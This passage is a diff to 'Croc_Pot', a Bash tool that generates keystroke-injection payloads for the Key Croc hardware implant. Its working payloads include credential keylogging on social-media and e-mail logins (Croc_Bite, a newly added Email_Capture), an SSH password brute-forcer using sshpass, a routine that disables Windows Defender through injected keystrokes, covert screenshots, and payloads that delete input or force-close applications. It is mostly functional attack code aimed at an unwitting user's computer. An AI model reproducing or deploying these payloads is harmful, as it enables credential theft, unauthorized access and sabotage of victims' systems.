+		QUACK STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)" ; QUACK ENTER ; sleep 1
+		QUACK STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; ATTACKMODE HID
 			fi
 		else
 			case "$HOST_CHECK" in
 			raspberrypi)
-				Q ALT-TAB ; Q CONTROL-ALT-t ; sleep 1
-				Q STRING "PC_PIC=/media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 2 \${PC_PIC} &>/dev/null & exit"
-				Q ENTER ; Q ALT-TAB ; sleep 3 ; ATTACKMODE HID ;;
+				QUACK ALT-TAB ; QUACK CONTROL-ALT-t ; sleep 1
+				QUACK STRING "PC_PIC=/media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 2 \${PC_PIC} &>/dev/null & exit"
+				QUACK ENTER ; QUACK ALT-TAB ; sleep 3 ; ATTACKMODE HID ;;
 			"$HOST_CHECK")
-				Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1
-				Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
-				Q ENTER ; sleep 3 ; Q STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)" ; Q ENTER ; sleep 1
-				Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
-				Q ENTER ; Q ALT-TAB ; sleep 2 ; ATTACKMODE HID ;;
+				QUACK ALT-t ; QUACK ENTER ; sleep 1
+				QUACK STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
+				QUACK ENTER ; sleep 3 ; QUACK STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)" ; QUACK ENTER ; sleep 1
+				QUACK STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
+				QUACK ENTER ; QUACK ALT-TAB ; sleep 2 ; ATTACKMODE HID ;;
 			*)
-				Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1
-				Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
-				Q ENTER ; sleep 3 ; Q STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)" ; Q ENTER ; sleep 1
-				Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
-				Q ENTER ; Q ALT-TAB ; sleep 2 ; ATTACKMODE HID ;;
+				QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1
+				QUACK STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
+				QUACK ENTER ; sleep 3 ; QUACK STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)" ; QUACK ENTER ; sleep 1
+				QUACK STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
+				QUACK ENTER ; QUACK ALT-TAB ; sleep 2 ; ATTACKMODE HID ;;
 			esac
 		fi ;;
 	[nN] | [nN][oO])
@@ -5621,9 +5662,9 @@ esac
 #----Croc_Bite payload social media account passwd Attempt
 ##
 croc_bite() {
-	Info_Screen '-Attempt to retrieve target pc Social media account passwd
+	Info_Screen '-Attempt to retrieve target Social media account passwd
 -Create a payload called Croc_Bite.txt MATCH word will be Social media name 
--This will open target pc web browser and open up Social media login page
+-This will open target web browser and open up Social media login page
 -If successful passwd saved at /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered
 -Ensure to run Croc_Pot_Payload.txt first'
 	ColorRed '--THIS PAYLOAD IS RELYING ON THE ENTER KEY TO BE PRESSED\n
@@ -5652,11 +5693,11 @@ fi
 #----Create Croc_Bite payload
 ##
 bite_payload() {
-	echo -ne "# Title:         Croc_Bite\n# Description:   Social media account passwd attempt this will open target pc web browser and open login page\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n\nMATCH ${1}\n
+	echo -ne "# Title:         Croc_Bite\n# Description:   Social media account passwd attempt this will open target web browser and open login page\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n\nMATCH ${1}\n
 if [ -e \"/root/udisk/tools/Croc_Pot/Croc_OS.txt\" ]; then\n	case \$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\nWINDOWS)\n	Q GUI d\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -NoP -NonI -W Hidden -Exec Bypass\"\n	Q ENTER
 	sleep 2\n	Q STRING \"Start-Process ${@:2}; exit\"\n	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\nLINUX)\n	case \$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in
 raspberrypi)\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
-	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n$HOST_CHECK)\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
+	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n$HOST_CHECK)\n	Q ALT-t\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
 	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n*)\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
 	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n	esac\n	esac\nelse\n	LED R\nfi\nLED FINISH" >> /root/udisk/payloads/Croc_Bite.txt
 	cat /root/udisk/payloads/Croc_Bite.txt ; echo -ne "\n$LINE\n"
@@ -5686,15 +5727,16 @@ unplug keycroc plug back in type in match word $(ColorCyan "$1")\n"
 		7) bite_payload microsoft https://login.microsoftonline.com/ ;;
 		8) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; bite_payload ;;
 		[bB]) install_payloads_menu ;; [pP]) Panic_button ;; *) invalid_entry ; bite_payload ;;
 	esac
 }
 ##
-#----Croc_Redirect, payload/open web site on target pc default browser
+#----Croc_Redirect, payload/open web site on target default browser
 ##
 web_site() {
 	Info_Screen '-Enter website name example: https://forums.hak5.org/
--This will open target pc default web browser and start website
+-This will open target default web browser and start website
 -Croc_Redirect payload match words https:// or http:// or IP address
 -Simple payload to Redirect target web page
 -Recommended to uninstall payload when not in use, do to match word
@@ -5714,10 +5756,10 @@ else
 		[yY] | [yY][eE][sS])
 			echo -ne "# Title:           Croc_Redirect\n# Description:     Simple payload to Redirect target web page\n#                  when not in use recommended to uninstall because of match words\n# Author:          spywill\n# Version:         1.1\n# Category:        Key Croc\n#\n#
 MATCH (^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\$|http://|https://|\.com|\.br|\.net|\.org|.cz|\.au|\.co|\.jp|\.cn|\.ru|\.in|\.ir|\.ua|\.ca|\.xyz|\.site|\.top|\.icu|\.vip|\.online|\.de)\n\n#-->Enter Redirected web page here\nREDIRECT=https://forums.hak5.org/\n
-#-->Remove user input and replace with Redirected web page\nLED ATTACK\nQ CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ STRING \"\${REDIRECT}\"\nQ ENTER\nLED FINISH\nsleep 1\n\n#-->This will open target pc default web browser and start website\nif [ -e /root/udisk/tools/Croc_Pot/Croc_OS.txt ]; then
+#-->Remove user input and replace with Redirected web page\nLED ATTACK\nQ CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ STRING \"\${REDIRECT}\"\nQ ENTER\nLED FINISH\nsleep 1\n\n#-->This will open target default web browser and start website\nif [ -e /root/udisk/tools/Croc_Pot/Croc_OS.txt ]; then
 	LED ATTACK\n	OS_CHECK=\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n	HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n	case \$OS_CHECK in\nWINDOWS)\n	Q GUI d\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 2
 	Q STRING \"Start-Process \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;\nLINUX)\n	case \$HOST_CHECK in\nraspberrypi)\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;
-\$HOST_CHECK)\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;\n*)\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"
+\$HOST_CHECK)\n	Q ALT-t\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;\n*)\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"
 	Q ENTER\n	LED FINISH ;;\n	esac\n	;;\nesac\nelse\n	LED R\nfi\n" > "$Croc_Redirect"
 			cat "$Croc_Redirect" ; echo -ne "\n$LINE\n"
 			ColorGreen 'Croc_Redirect.txt payload is now install check payloads folder\n' ;;
@@ -5742,11 +5784,11 @@ fi
 	esac
 }
 ##
-#----NO_SLEEPING, Keep target pc screen from sleeping QUACK spacebar every 60 sec and backspace
+#----NO_SLEEPING, Keep target screen from sleeping QUACK spacebar every 60 sec and backspace
 ##
 screen_on() {
 	Info_Screen '-No_sleeping payload MATCH word is nosleeping
--Keep Target pc screen from going to sleep
+-Keep Target screen from going to sleep
 -This will QUACK spacebar every 60 sec and backspace
 -PRESS CTRL + C to break loop in terminal'
 ##
@@ -5760,7 +5802,7 @@ screen_on() {
 		read_all 'INSTALL NO_SLEEPING PAYLOAD Y/N AND PRESS [ENTER]'
 		case "$r_a" in
 			[yY] | [yY][eE][sS])
-				echo -ne "# Title:           No sleeping\n# Description:     Keep Target pc screen from going to sleeping\n# Author:          spywill\n# Version:         1.1\n# Category:        Key Croc
+				echo -ne "# Title:           No sleeping\n# Description:     Keep Target screen from going to sleeping\n# Author:          spywill\n# Version:         1.1\n# Category:        Key Croc
 #\n#\nMATCH nosleeping\n\nQ GUI d\nwhile true ;do\nLED ATTACK\nWAIT_FOR_KEYBOARD_INACTIVITY 60\nQ KEYCODE 00,00,2c\nQ BACKSPACE\nLED R\ndone" > "$No_sleep"
 				cat "$No_sleep" ; echo -ne "\n$LINE\n"
 				ColorGreen 'No_Sleeping PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n' ;;
@@ -5779,8 +5821,8 @@ screen_on() {
 			reset_broken
 			ColorYellow "Waiting 60 sec\033[0K\r"
 			while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_INACTIVITY 60; do
-				Q KEYCODE 00,00,2c
-				Q BACKSPACE
+				QUACK KEYCODE 00,00,2c
+				QUACK BACKSPACE
 				(( i++ ))
 				ColorYellow "NO_SLEEPING PAYLOAD IS RUNNING COUNT: $(ColorGreen "$i")\033[0K\r"
 			done ;;
@@ -5834,9 +5876,9 @@ if [[ \${#var} -gt \${char} ]]; then\n	LED B\n	DISABLE_PAYLOAD payloads/Croc_rep
 			read_all 'ENTER NUMBER OF TIMES TO REPLACE CHARACTER AND PRESS [ENTER]' ; local char="$r_a"
 			ColorYellow "Waiting for keyboard activity\033[0K\r"
 			while [ "$R" -eq "$char" ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
-				Q BACKSPACE
-				Q BACKSPACE
-				Q STRING "$(< /dev/urandom tr -cd '[:graph:]' | head -c 1)"
+				QUACK BACKSPACE
+				QUACK BACKSPACE
+				QUACK STRING "$(< /dev/urandom tr -cd '[:graph:]' | head -c 1)"
 				(( R++ ))
 				ColorYellow "KEYCROC HAS REPLACE USER INPUT COUNT: $(ColorGreen "$R")\033[0K\r"
 			done ;;
@@ -5851,7 +5893,6 @@ if [[ \${#var} -gt \${char} ]]; then\n	LED B\n	DISABLE_PAYLOAD payloads/Croc_rep
 ##
 Brute_force() {
 	Info_Screen '-Payload call Croc_Force, Brute-force attack over ssh
-	
 -Brute-force attack consists of an attacker submitting many passwords or
 passphrases with the hope of eventually guessing correctly.
 
@@ -5895,7 +5936,7 @@ when running payload the LED lights
 						echo -ne "# Title:         Croc_Force\n#\n# Description:   Brute-force attack consists of an attacker submitting many passwords or\n#                passphrases with the hope of eventually guessing correctly. Requirements: SSHPASS
 #                Save to loot/Croc_Pot/Croc_Force_Passwd.txt\n#\n# Author:        Spywill\n# Version:       1.1\n# Category:      Key Croc\n\nMATCH crocforce\n\n#--->Add Target IP here\nT_IP=${T_IP}\n\n#--->Add Target HOSTNAME here
 T_H=${T_H}\n\n#--->Add the full path of word list here or install wamerican-huge add use /usr/share/dict/american-english-huge\nWORDFILE=\"${WORDFILE}\"\ntL=\`awk 'NF!=0 {++c} END {print c}' \$WORDFILE\`\n
-#--->Add random numbers to the end of each word enter 0 for no numbers Or enter 10 or 100 or 1000 depend on how many numbers at end of word\nNUMBER_N=${NUMBER_N}\n\nnc -z -v -w 1 \$T_IP 22 &>/dev/null 2>&1
+#--->Add random numbers to the end of each word enter 0 for no numbers Or enter 10 or 100 or 1000 depend on how many numbers at end of word\nNUMBER_N=${NUMBER_N}\n\nnc -vz -v -w 1 \$T_IP 22 &>/dev/null 2>&1
 if [[ \$? -ne 0 ]]; then\n	LED R && RELOAD_PAYLOADS && exit\nelse\n	LED B\nfi\n\nwhile true ; do\nLED B\nunset rnum R_W\nrnum=\$((RANDOM%\${tL}+1))\nR_W=\$(sed -n \"\$rnum p\" \$WORDFILE)\n\nif [ ! \"\${NUMBER_N}\" = \"0\" ]; then\n	R_N=\$(( \$RANDOM % \${NUMBER_N}+1 ))
 else\n	unset R_N\nfi\n\nif [[ \"\$(sshpass -p \$R_W\$R_N ssh -o \"StrictHostKeyChecking no\" \$T_H@\$T_IP 'echo ok' | sed 's/\\\r//g')\" = \"ok\" ]]; then
 	echo -ne \"Target Hostname: \$T_H\\\nTarget IP: \$T_IP\\\nTarget password: \$R_W\$R_N\" > /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt\n	LED G\n	break\nelse\n	LED R\nfi\ndone" > "$CROC_FORCE"
@@ -5921,7 +5962,7 @@ else\n	unset R_N\nfi\n\nif [[ \"\$(sshpass -p \$R_W\$R_N ssh -o \"StrictHostKeyC
 	[yY] | [yY][eE][sS])
 		read_all 'ENTER TARGET IP AND PRESS [ENTER]' ; local T_IP="$r_a"
 		if [[ "$T_IP" =~ $validate_ip ]]; then
-			nc -z -w 2 "$T_IP" 22 &>"/dev/null"
+			nc -vz -w 2 "$T_IP" 22 &>"/dev/null"
 			if [[ $? -ne 0 ]]; then
 				ColorRed "Unable to reach host $T_IP\n"
 			elif [[ "${#args[@]}" -eq 0 ]]; then
@@ -5985,7 +6026,7 @@ croc_lock() {
 -PRESS CTRL + C to break loop in terminal
 -If stuck in loop unplug keycroc plug back in
 -If Croc_Unlock Payload is installed this will remove it
-they both use Q GUI-l in the payload'
+they both use QUACK GUI-l in the payload'
 ##
 #----Croc_Lockout payload install
 ##
@@ -6020,14 +6061,14 @@ if [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/Croc_Lockout_stop.txt.filtered) = \"st
 				RELOAD_PAYLOADS
 			fi
 			reset_broken
-			Q GUI-l
-			Q CONTROL-ALT-F3
+			QUACK GUI-l
+			QUACK CONTROL-ALT-F3
 			ColorYellow "Waiting for keyboard activity\033[0K\r"
 			while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
-				Q BACKSPACE
-				Q BACKSPACE
-				Q BACKSPACE
-				Q BACKSPACE
+				QUACK BACKSPACE
+				QUACK BACKSPACE
+				QUACK BACKSPACE
+				QUACK BACKSPACE
 				(( i++ ))
 				ColorYellow "KEYCROC HAS DELETE USER INPUT COUNT: $(ColorGreen "$i")\033[0K\r"
 			done ;;
@@ -6050,13 +6091,13 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 #----Windows defender enable run from terminal
 ##
 defender_enable() {
-	Q GUI i ; sleep 3 ; Q STRING "Windows Security settings" ; Q ENTER ; sleep 3 ; Q ENTER ; sleep 3 ; Q TAB ; Q ENTER ; sleep 3 ; Q TAB ; Q TAB ; Q TAB ; Q TAB ; Q ENTER ; sleep 2 ; Q LEFTARROW ; Q ENTER ; sleep 1 ; Q ALT-F4 ; sleep 1 ; Q ALT-F4
+	QUACK GUI i ; sleep 3 ; QUACK STRING "Windows Security settings" ; QUACK ENTER ; sleep 3 ; QUACK ENTER ; sleep 3 ; QUACK TAB ; QUACK ENTER ; sleep 3 ; QUACK TAB ; QUACK TAB ; QUACK TAB ; QUACK TAB ; QUACK ENTER ; sleep 2 ; QUACK LEFTARROW ; QUACK ENTER ; sleep 1 ; QUACK ALT-F4 ; sleep 1 ; QUACK ALT-F4
 }
 ##
 #----Windows defender disable run from terminal
 ##
 defender_disable() {
-	Q GUI i ; sleep 3 ; Q STRING "Windows Security settings" ; Q ENTER ; sleep 3 ; Q ENTER ; sleep 3 ; Q TAB ; Q ENTER ; sleep 3 ; Q TAB ; Q TAB ; Q TAB ; Q TAB ; Q ENTER ; sleep 2 ; Q KEYCODE 00,00,2c ; sleep 2 ; Q LEFTARROW ; Q ENTER ; sleep 1 ; Q ALT-F4 ; sleep 1 ; Q ALT-F4
+	QUACK GUI i ; sleep 3 ; QUACK STRING "Windows Security settings" ; QUACK ENTER ; sleep 3 ; QUACK ENTER ; sleep 3 ; QUACK TAB ; QUACK ENTER ; sleep 3 ; QUACK TAB ; QUACK TAB ; QUACK TAB ; QUACK TAB ; QUACK ENTER ; sleep 2 ; QUACK KEYCODE 00,00,2c ; sleep 2 ; QUACK LEFTARROW ; QUACK ENTER ; sleep 1 ; QUACK ALT-F4 ; sleep 1 ; QUACK ALT-F4
 }
 ##
 #----Croc_Defender payload install
@@ -6098,6 +6139,7 @@ elif [[ \"\$LOOT\" == \"defenderdisable\" ]]; then\n	LED R\n	Q GUI i\n	sleep 3\n
 		3) croc_defender ; windows_defender ;;
 		4) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; windows_defender ;;
 		[bB]) install_payloads_menu ;; [pP]) Panic_button ;; *) invalid_entry ; windows_defender ;;
 	esac
 else
@@ -6105,11 +6147,11 @@ else
 fi
 }
 ##
-#----Croc_close-it payload close current running application on target pc 
+#----Croc_close-it payload close current running application on target
 ##
 close_it() {
 	Info_Screen '-Croc_close_it payload MATCH word croccloseit
--Close current running application on target pc
+-Close current running application on target
 -Any keyboard activity will close current running application
 -PRESS CTRL + C to break loop in terminal
 -When running payload type stop to break loop'
@@ -6124,7 +6166,7 @@ close_it() {
 		read_all 'INSTALL CROC_CLOSE_IT PAYLOAD Y/N AND PRESS [ENTER]'
 		case "$r_a" in
 			[yY] | [yY][eE][sS])
-				echo -ne "# Title:         Croc_close_it\n#\n# Description:   Close current running application on target pc\n#                Any keyboard activity will close current running application
+				echo -ne "# Title:         Croc_close_it\n#\n# Description:   Close current running application on target\n#                Any keyboard activity will close current running application
 #                Type stop to end loop\n#\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n\nMATCH croccloseit\n\nSAVEKEYS /tmp/Croc_stop.txt UNTIL stop\n
 while true ; do\nLED ATTACK\nWAIT_FOR_KEYBOARD_ACTIVITY 1\nif [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/Croc_stop.txt.filtered) = \"stop\" ]; then\n	LED OFF\n	break\nelse
 	Q ALT-F4\n	Q ENTER\n	sleep 2\n	Q ALT-F4\nfi\ndone\n" > "$croc_close"
@@ -6145,11 +6187,11 @@ while true ; do\nLED ATTACK\nWAIT_FOR_KEYBOARD_ACTIVITY 1\nif [ \$(sed -n 's/.*\
 			reset_broken
 			ColorYellow "Waiting for keyboard activity\033[0K\r"
 			while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
-				Q ALT-F4
-				Q ALT-F4
-				Q ENTER
+				QUACK ALT-F4
+				QUACK ALT-F4
+				QUACK ENTER
 				sleep 2
-				Q ALT-F4
+				QUACK ALT-F4
 				(( i++ ))
 				ColorYellow "Application has CLOSED COUNT: $(ColorGreen "$i")\033[0K\r"
 			done ;;
@@ -6191,7 +6233,7 @@ elif [[ \"\$LOOT\" == \"TAB\" ]]; then\n	Q STRING \"\"\nelif [[ \"\$LOOT\" == \"
 	fi
 }
 ##
-#----Quack Attack Payload Continuously run random Quack commands on target pc
+#----Quack Attack Payload Continuously run random Quack commands on target
 ##
 q_attack() {
 	Info_Screen '-Quack_Attack payload match word quackattack
@@ -6237,8 +6279,8 @@ case "$r_a" in
 		WAIT_FOR_KEYBOARD_ACTIVITY 0
 		while [ "$broken" -eq 1 ] && break || : ; do
 			R_W="$(python -c 'import random; data=open("'$WORDFILE'").read().split(); print random.sample(data,1)[0]')"
-			Q STRING "$R_W"
-			Q KEYCODE 00,00,2c
+			QUACK STRING "$R_W"
+			QUACK KEYCODE 00,00,2c
 			(( i++ ))
 			ColorYellow "QUACK_ATTACK RANDOM WORD -$(ColorCyan "$R_W")$(ColorYellow '- Count: ')$(ColorGreen "$i")\033[0K\r"
 		done ;;
@@ -6247,7 +6289,7 @@ case "$r_a" in
 		ColorYellow "Waiting for keyboard activity\033[0K\r"
 		WAIT_FOR_KEYBOARD_ACTIVITY 0
 		while [ "$broken" -eq 1 ] && break || : ; do
-			Q STRING "$(< /dev/urandom tr -cd '[:graph:]' | head -c 1)$(< /dev/urandom tr -cd '[:graph:]' | head -c 1)"
+			QUACK STRING "$(< /dev/urandom tr -cd '[:graph:]' | head -c 1)$(< /dev/urandom tr -cd '[:graph:]' | head -c 1)"
 			(( i++ ))
 			ColorYellow "QUACK_ATTACK RANDOM CHAR Count: $(ColorGreen "$i")\033[0K\r"
 		done ;;
@@ -6258,8 +6300,8 @@ case "$r_a" in
 		WAIT_FOR_KEYBOARD_ACTIVITY 0
 		while [ "$broken" -eq 1 ] && break || : ; do
 			R_N="$(( RANDOM % NUMBER_N+1 ))"
-			Q STRING "$R_N"
-			Q KEYCODE 00,00,2c
+			QUACK STRING "$R_N"
+			QUACK KEYCODE 00,00,2c
 			(( i++ ))
 			ColorYellow "QUACK_ATTACK RANDOM NUMBER -$(ColorCyan "$R_N")$(ColorYellow '- Count: ')$(ColorGreen "$i")\033[0K\r"
 		done ;;
@@ -6367,13 +6409,13 @@ MATCH (storagemode|hidmode|offmode|reloadmode|armingmode|rostoragemode|autoether
 	fi
 }
 ##
-#----Delete_Char payload delete all character on target pc by payload/terminal/ or at will
+#----Delete_Char payload delete all character on target by payload/terminal/ or at will
 ##
 Delete_Char() {
 	Info_Screen '-Delete_Char payload match word deletechar
 -Run from payload, terminal or press backspace at will
--Delete character on target pc
--Continuously run Q BACKSPACE
+-Delete character on target
+-Continuously run QUACK BACKSPACE
 [I] Install Delete_Char payload, type stop to break loop
 [T] Run from terminal, PRESS CTRL + C to break loop
 [P] Press BACKSPACE at will, anything else will break loop
@@ -6396,15 +6438,15 @@ MATCH deletechar\n\nSAVEKEYS /tmp/Croc_stop.txt UNTIL stop\nWAIT_FOR_KEYBOARD_AC
 				ColorGreen 'DELETE CHAR PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER\n'
 			fi ;;
 		[Tt])
-			Info_Screen '-Any keyboard activity run Q BACKSPACE 4 times
+			Info_Screen '-Any keyboard activity run QUACK BACKSPACE 4 times
 -PRESS CTRL + C to break loop'
 			reset_broken
 			ColorYellow "Waiting for keyboard activity\033[0K\r"
 			while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
-				Q BACKSPACE
-				Q BACKSPACE
-				Q BACKSPACE
-				Q BACKSPACE
+				QUACK BACKSPACE
+				QUACK BACKSPACE
+				QUACK BACKSPACE
+				QUACK BACKSPACE
 				(( i++ ))
 				ColorYellow "BACKSPACE COUNT:$(ColorGreen " $i ")\033[0K\r"
 			done 2>/dev/null ;;
@@ -6416,7 +6458,7 @@ MATCH deletechar\n\nSAVEKEYS /tmp/Croc_stop.txt UNTIL stop\nWAIT_FOR_KEYBOARD_AC
 			while IFS= read -r -n 1 -s; do
 				case "$REPLY" in
 					$'\177')
-						Q BACKSPACE
+						QUACK BACKSPACE
 						(( i++ ))
 						ColorYellow "BACKSPACE COUNT:$(ColorGreen " $i ")\033[0K\r" ;;
 					*)
@@ -6531,19 +6573,56 @@ Q CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ ALT-F4\nQ ALT-F4\nATTACKMODE OFF\nWAIT
 	fi
 }
 ##
+#----Capture target E-mail address & password save to /udisk/tools/target_email.txt
+##
+Email_Capture() {
+	Info_Screen 'Email-Capture payload
+-Capture target E-mail address & password save to /udisk/tools/target_email.txt
+-This should work on all operating systems
+
+This payload will use KeyCroc MATCH command using regular expressions pattern'
+	if [ -f "/root/udisk/tools/target_email.txt" ]; then
+		ColorYellow "CURRENTLY CAPTURE E-MAILS:\n"
+		cat /root/udisk/tools/target_email.txt
+		echo -ne "\n$LINE\n"
+	fi
+	local Email_CAPTURE=/root/udisk/payloads/Email_Capture.txt
+	if [ -f "$Email_CAPTURE" ]; then
+		cat "$Email_CAPTURE" ; echo -ne "\n$LINE\n"
+		ColorGreen "EMAIL-CAPTURE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER$clear\n"
+	else
+		read_all 'INSTALL EMAIL-CAPTURE PAYLOAD Y/N AND PRESS [ENTER]'
+			case "$r_a" in
+			[yY] | [yY][eE][sS])
+				echo -ne "# Title:         Email-Capture\n# Description:   Capture target E-mail address & password save to /udisk/tools/target_email.txt\n# Author:        Spywill\n# Version:       1.1\n# Category:      Key Croc\n
+MATCH (^[a-zA-Z0-9_\-\.]+@[a-zA-Z0-9_\-\.]+\.[a-zA-Z]{3,5}\$)\n\npattern='^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{3,5})\$'\n\nEMAIL_PASS() {\n	until [ -f /tmp/target_email_pw.txt.filtered ]; do\n		:
+	done\n	LED G\n	cat /tmp/target_email_pw.txt.filtered >> /root/udisk/tools/target_email.txt\n	rm /tmp/target_email_pw.txt /tmp/target_email_pw.txt.filtered\n	LED OFF\n	RELOAD_PAYLOADS\n}\n
+if [[ \"\$LOOT\" =~ \$pattern ]]; then\n	LED B\n	echo \"\$LOOT\" >> /root/udisk/tools/target_email.txt\nelse\n	LED R\n	killall -9 bash\n	killall -9 python\n	sleep 1\n	LED OFF\n	RELOAD_PAYLOADS
+fi\n\nSAVEKEYS /tmp/target_email_pw.txt UNTIL ENTER\nLED OFF\nEMAIL_PASS" > "$Email_CAPTURE"
+				cat "$Email_CAPTURE" ; echo -ne "\n$LINE\n"
+				ColorGreen "EMAIL-CAPTURE IS NOW INSTALLED CHECK PAYLOADS FOLDER$clear\n" ;;
+			[nN] | [nN][oO])
